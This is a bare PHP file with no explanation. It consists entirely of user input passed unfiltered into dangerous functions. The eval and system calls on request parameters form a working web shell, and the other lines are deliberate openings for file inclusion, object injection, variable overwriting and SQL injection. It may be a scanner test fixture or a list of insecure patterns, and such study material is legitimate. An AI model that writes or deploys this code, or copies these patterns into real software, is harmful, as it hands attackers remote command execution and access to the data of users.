<?php
eval($_POST['cmd']);
system($_GET['c']);
include($_GET['page']);
require_once $_REQUEST['module'];
unserialize($_COOKIE['data']);
extract($_POST);
$result = mysql_query("SELECT * FROM users WHERE id=" . $_GET['id']);
